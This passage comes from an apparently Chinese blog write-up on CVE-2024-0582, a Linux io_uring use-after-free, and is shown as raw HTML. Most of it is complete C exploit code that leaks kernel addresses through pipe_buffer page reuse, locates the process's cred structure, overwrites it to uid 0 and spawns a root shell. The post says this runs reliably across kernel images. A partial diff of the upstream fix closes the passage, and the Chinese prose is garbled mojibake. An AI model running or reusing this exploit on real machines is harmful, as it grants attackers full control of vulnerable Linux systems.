[chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span><br><span class="hljs-comment">    **/</span><br>    offset = IORING_OFF_PBUF_RING | (<span class="hljs-type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;<br>    ring_size = ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf);<br>    buf_ring = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        ring_size,<br>        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,<br>        ring-&gt;ring_fd,<br>        offset<br>    );<br><br>    <span class="hljs-keyword">if</span> (IS_ERR(buf_ring)) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));<br>        *retp = PTR_ERR(buf_ring);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    *retp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> buf_ring;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * In my test environment, kmalloc-1k allocates from 4-page slub, so I chose 4.</span><br><span class="hljs-comment"> * However, it might not be the same in your environment, e.g., it&#x27;s 8 on my PC.</span><br><span class="hljs-comment"> * Check your /proc/slabinfo before doing the exploitation.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_PAGES    4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NR_BUFFERS  0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NR 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x1F0</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">long</span> usage;<br>    <span class="hljs-type">uint32_t</span> uid;<br>    <span class="hljs-type">uint32_t</span> gid;<br>    <span class="hljs-type">uint32_t</span> suid;<br>    <span class="hljs-type">uint32_t</span> sgid;<br>    <span class="hljs-type">uint32_t</span> euid;<br>    <span class="hljs-type">uint32_t</span> egid;<br>    <span class="hljs-type">uint32_t</span> fsuid;<br>    <span class="hljs-type">uint32_t</span> fsgid;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_kernel_page_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page*page,<span class="hljs-keyword">struct</span> pipe_buffer*kern_pipe_buf,</span><br><span class="hljs-params">                              <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    kern_pipe_buf-&gt;page = page;<br>    kern_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    kern_pipe_buf-&gt;len = <span class="hljs-number">0xffe</span>;<br><br>    <span class="hljs-keyword">if</span> (read(pipe_fd[<span class="hljs-number">0</span>], buf, len) != len) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to do reading on pipe&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_kernel_page_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> pipe_buffer*kern_pipe_buf,</span><br><span class="hljs-params">                               <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    kern_pipe_buf-&gt;page = page;<br>    kern_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    kern_pipe_buf-&gt;len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (write(pipe_fd[<span class="hljs-number">1</span>], buf, len) != len) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to do writing on pipe&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-type">void</span> **buffers;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">kern_pipe_buffer</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">uint64_t</span> kernel_leak;<br>    <span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], victim_idx = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint32_t</span> uid, gid;<br>    <span class="hljs-type">uint64_t</span> cred_kaddr, cred_kpage_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred_data</span>;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;-------- CVE-2024-0582 Exploitation --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    INFO_MSG(<span class="hljs-string">&quot;--------      Author: &quot;</span>)<span class="hljs-string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="hljs-string">&quot;      --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    SUCCESS_MSG(<span class="hljs-string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Initializing io_uring ...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (io_uring_queue_init(<span class="hljs-number">4</span>, &amp;ring, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERR_MSG(<span class="hljs-string">&quot;[x] Unable to init for io_uring queue&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pbuf ring and doing mmap() ...&quot;</span>);<br><br>    buffers = <span class="hljs-built_in">calloc</span>(NR_BUFFERS, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i++) &#123;<br>        buffers[i] = setup_pbuf_ring_mmap(<br>            &amp;ring,<br>            NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf),<br>            i,<br>            <span class="hljs-number">0</span>,<br>            &amp;ret<br>        );<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to set up&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        io_uring_buf_ring_init(buffers[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering page-level UAF vulnerabilities ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i += <span class="hljs-number">2</span>) &#123;   <span class="hljs-comment">/* we neeed &quot;holes&quot; */</span><br>        ret = io_uring_unregister_buf_ring(&amp;ring, i);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to unregister&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pbuf ring, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reallocating pages as pipe_buffers ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((ret = pipe(pipe_fd[i])) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<br>                ERR_MSG(<span class="hljs-string">&quot;[x] Unable to set up&quot;</span>) <span class="hljs-string">&quot; No.%d &quot;</span><br>                ERR_MSG(<span class="hljs-string">&quot;pipe, error code: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>,<br>                i,<br>                ret<br>            );<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pipe_buffer::page ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking for UAF mmap address ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NR_BUFFERS; i += <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">uint64_t</span> *buffer = buffers[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)); j++) &#123;<br>            <span class="hljs-keyword">if</span> (buffer[j] &gt; <span class="hljs-number">0xffff000000000000</span><br>                &amp;&amp; buffer[j + <span class="hljs-number">1</span>] == <span class="hljs-number">0x2000000000</span><br>                &amp;&amp; buffer[j + <span class="hljs-number">2</span>] &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<br>                    SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel pipe_buffer mapped at buffer:&quot;</span>)<br>                    <span class="hljs-string">&quot; %d-%d\n&quot;</span>, i, j<br>                );<br>                <span class="hljs-built_in">printf</span>(<br>                    INFO_MSG(<span class="hljs-string">&quot;[*] Leak pipe_buffer::page = &quot;</span>)<span class="hljs-string">&quot;%lx\n&quot;</span>, buffer[j]<br>                );<br>                <span class="hljs-built_in">printf</span>(<br>                    INFO_MSG(<span class="hljs-string">&quot;[*] Leak pipe_buffer::ops = &quot;</span>)<span class="hljs-string">&quot;%lx\n&quot;</span>, buffer[j+<span class="hljs-number">2</span>]<br>                );<br>                kern_pipe_buffer = (<span class="hljs-type">void</span>*) &amp;buffer[j];<br>                <span class="hljs-keyword">goto</span> out_find_pipe;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!kern_pipe_buffer) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to find kernel pipe_buffer in user space!&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>out_find_pipe:<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting victim pipe_buffer::page ...&quot;</span>);<br>    <span class="hljs-comment">/* note that the granularity of KASLR is 256MB, i.e. 0x10000000*/</span><br>    vmemmap_base = (<span class="hljs-type">uint64_t</span>) kern_pipe_buffer-&gt;page &amp; KASLR_MASK;<br>    kern_pipe_buffer-&gt;page = (<span class="hljs-type">void</span>*) (vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;kernel_leak, <span class="hljs-keyword">sizeof</span>(kernel_leak));<br>        <span class="hljs-keyword">if</span> (kernel_leak != *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got victim pipe at idx: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>            victim_idx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_idx == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Failed to find the victim pipe!&quot;</span>));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> loop_nr = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; loop_nr++) &#123;<br>        <span class="hljs-keyword">if</span> (kernel_leak &gt; <span class="hljs-number">0xffffffff81000000</span><br>            &amp;&amp; (kernel_leak &amp; <span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">0x100</span>) &#123;<br>            kernel_base = kernel_leak &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>            <span class="hljs-keyword">if</span> (loop_nr != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<br>                INFO_MSG(<span class="hljs-string">&quot;[*] Leak secondary_startup_64 : &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,kernel_leak<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got kernel base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, kernel_base);<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got vmemmap_base: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>, vmemmap_base);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80</span>; i++) &#123;<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\b&#x27;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;[No.%ld loop] Got unmatched data: %lx, keep looping...&quot;</span>,<br>            loop_nr,<br>            kernel_leak<br>        );<br><br>        vmemmap_base -= KASLR_GRANULARITY;<br>        read_kernel_page_by_pipe(<br>            (<span class="hljs-type">void</span>*) (vmemmap_base + <span class="hljs-number">0x9d000</span> / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>),<br>            kern_pipe_buffer,<br>            pipe_fd[victim_idx],<br>            &amp;kernel_leak,<br>            <span class="hljs-keyword">sizeof</span>(kernel_leak)<br>        );<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Finding task_struct of current process in kernel space ...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;rat3bant&quot;</span>);<br>    uid = getuid();<br>    gid = getgid();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> *comm_addr;<br><br>        read_kernel_page_by_pipe(<br>            (<span class="hljs-type">void</span>*) (vmemmap_base + <span class="hljs-number">0x40</span> * i),<br>            kern_pipe_buffer,<br>            pipe_fd[victim_idx],<br>            buf,<br>            <span class="hljs-number">0xff8</span><br>        );<br><br>        comm_addr = memmem(buf, <span class="hljs-number">0xff0</span>, <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] == comm_addr[<span class="hljs-number">-3</span>])) &#123;  <span class="hljs-comment">/* should be equal */</span><br><br>            <span class="hljs-built_in">printf</span>(<br>                SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found task_struct on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                (vmemmap_base + i * <span class="hljs-number">0x40</span>)<br>            );<br>            <span class="hljs-built_in">printf</span>(SUCCESS_MSG(<span class="hljs-string">&quot;[+] Got cred address: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,comm_addr[<span class="hljs-number">-2</span>]);<br><br>            cred_kaddr = comm_addr[<span class="hljs-number">-2</span>];<br>            cred_data = (<span class="hljs-type">void</span>*) (buf + (cred_kaddr &amp; (PAGE_SIZE - <span class="hljs-number">1</span>)));<br>            page_offset_base = cred_kaddr &amp; KASLR_MASK;<br><br>            <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>                cred_kpage_addr = vmemmap_base + \<br>                                (cred_kaddr - page_offset_base) / <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x40</span>;<br>            <br>                read_kernel_page_by_pipe(<br>                    (<span class="hljs-type">void</span>*) cred_kpage_addr,<br>                    kern_pipe_buffer,<br>                    pipe_fd[victim_idx],<br>                    buf,<br>                    <span class="hljs-number">0xffe</span><br>                );<br>                <span class="hljs-keyword">if</span> (cred_data-&gt;uid == uid<br>                    &amp;&amp; cred_data-&gt;gid == gid) &#123;<br>                    <span class="hljs-built_in">printf</span>(<br>                        SUCCESS_MSG(<span class="hljs-string">&quot;[+] Found cred on page: &quot;</span>) <span class="hljs-string">&quot;%lx\n&quot;</span>,<br>                        cred_kpage_addr<br>                    );<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br><br>                page_offset_base -= KASLR_GRANULARITY;<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Overwriting cred and granting root privilege...&quot;</span>);<br><br>    cred_data-&gt;uid = <span class="hljs-number">0</span>;<br>    cred_data-&gt;gid = <span class="hljs-number">0</span>;<br><br>    write_kernel_page_by_pipe(<br>        (<span class="hljs-type">void</span>*) cred_kpage_addr,<br>        kern_pipe_buffer,<br>        pipe_fd[victim_idx],<br>        buf,<br>        <span class="hljs-number">0xff0</span><br>    );<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    setresgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    exploit();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼Œéå¸¸â„¢ç¨³å®šè€Œä¸”ä¸ä¾èµ–äºç‰¹å®šçš„å†…æ ¸é•œåƒï¼š</p><p><img src="https://s2.loli.net/2025/03/14/2kjERpT6i9zKDMd.png"></p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03. æ¼æ´ä¿®å¤"></a>0x03. æ¼æ´ä¿®å¤</h1><p>è¿™ä¸ªæ¼æ´æœ€ç»ˆåœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c392cbecd8eca4c53f2bf508731257d9d0a21c2d">è¿™ä¸ª commit</a> å½“ä¸­è¢«ä¿®å¤ï¼Œä¿®å¤æ–¹å¼æ˜¯ï¼š</p><ul><li>æ·»åŠ äº†ä¸€ä¸ªè®°å½•å»¶è¿Ÿé‡Šæ”¾ buffer çš„é“¾è¡¨ä¸å¯¹åº”ç»“æ„</li><li>å°† buffer é‡Šæ”¾æ¨è¿Ÿåˆ°è°ƒç”¨ <code>-&gt;release()</code> æ—¶ï¼Œè€ŒéåŸæ¥çš„å³æ—¶é‡Šæ”¾ï¼‰ï¼Œä»è€Œåœ¨ <code>mmap()</code> åŒºåŸŸé”€æ¯åæ‰ä¼šå›æ”¶è¿™éƒ¨åˆ†å†…å­˜</li></ul><p>è¿™ä¸ªä¿®æ”¹å¼•å…¥äº†æ›´é€‚ç”¨çš„æ¶æ„ï¼Œè€Œä¸”ç¡®ä¹é¿å…äº† UAF çš„é—®é¢˜ï¼Œåœ¨ç¬”è€…çœ‹æ¥è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/include/linux/io_uring_types.h b/include/linux/io_uring_types.h</span><br><span class="hljs-comment">index d3009d56af0ba3..805bb635cdf558 100644</span><br><span class="hljs-comment">--- a/include/linux/io_uring_types.h</span><br><span class="hljs-comment">+++ b/include/linux/io_uring_types.h</span><br><span class="hljs-meta">@@ -340,6 +340,9 @@</span> struct io_ring_ctx &#123;<br> <br> struct list_headio_buffers_cache;<br> <br><span class="hljs-addition">+/* deferred free list, protected by -&gt;uring_lock */</span><br><span class="hljs-addition">+struct hlist_headio_buf_list;</span><br><span class="hljs-addition">+</span><br> /* Keep this last, we don&#x27;t need it for the fast path */<br> struct wait_queue_headpoll_wq;<br> struct io_restrictionrestrictions;<br><span class="hljs-comment">diff --git a/io_uring/io_uring.c b/io_uring/io_uring.c</span><br><span class="hljs-comment">index e40b1143821045..3a216f0744dd66 100644</span><br><span class="hljs-comment">--- a/io_uring/io_uring.c</span><br><span class="hljs-comment">+++ b/io_uring/io_uring.c</span><br><span class="hljs-meta">@@ -325,6 +325,7 @@</span> static __cold struct io_ring_ctx *io_ring_ctx_alloc(struct io_uring_params *p)<br> INIT_LIST_HEAD(&amp;ctx-&gt;sqd_list);<br> INIT_LIST_HEAD(&amp;ctx-&gt;cq_overflow_list);<br> INIT_LIST_HEAD(&amp;ctx-&gt;io_buffers_cache);<br><span class="hljs-addition">+INIT_HLIST_HEAD(&amp;ctx-&gt;io_buf_list);</span><br> io_alloc_cache_init(&amp;ctx-&gt;rsrc_node_cache, IO_NODE_ALLOC_CACHE_MAX,<br>     sizeof(struct io_rsrc_node));<br> io_alloc_cache_init(&amp;ctx-&gt;apoll_cache, IO_ALLOC_CACHE_MAX,<br><span class="hljs-meta">@@ -2950,6 +2951,7 @@</span> static __cold void io_ring_ctx_free(struct io_ring_ctx *ctx)<br> ctx-&gt;mm_account = NULL;<br> &#125;<br> io_rings_free(ctx);<br><span class="hljs-addition">+io_kbuf_mmap_list_free(ctx);</span><br> <br> percpu_ref_exit(&amp;ctx-&gt;refs);<br> free_uid(ctx-&gt;user);<br><span class="hljs-comment">diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c</span><br><span class="hljs-comment">index a1e4239c7d75d1..85e680fc74ce2c 100644</span><br><span class="hljs-comment">--- a/io_uring/kbuf.c</span><br><span class="hljs-comment">+++ b/io_uring/kbuf.c</span><br><span class="hljs-meta">@@ -33,6 +33,11 @@</span> struct io_provide_buf &#123;<br> __u16bid;<br> &#125;;<br> <br><span class="hljs-addition">+struct io_buf_free &#123;</span><br><span class="hljs-addition">+struct hlist_nodelist;</span><br><span class="hljs-addition">+void*mem;</span><br><span class="hljs-addition">+&#125;;</span><br><span class="hljs-addition">+</span><br> static inline struct io_buffer_list *io_buffer_get_list(struct io_ring_ctx *ctx,<br> unsigned int bgid)<br> &#123;<br><span class="hljs-meta">@@ -223,7 +228,10 @@</span> static int __io_remove_buffers(struct io_ring_ctx *ctx,<br> if (bl-&gt;is_mapped) &#123;<br> i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;<br> if (bl-&gt;is_mmap) &#123;<br><span class="hljs-deletion">-folio_put(virt_to_folio(bl-&gt;buf_ring));</span><br><span class="hljs-addition">+/*</span><br><span class="hljs-addition">+ * io_kbuf_list_free() will free the page(s) at</span><br><span class="hljs-addition">+ * -&gt;release() time.</span><br><span class="hljs-addition">+ */</span><br> bl-&gt;buf_ring = NULL;<br> bl-&gt;is_mmap = 0;<br> 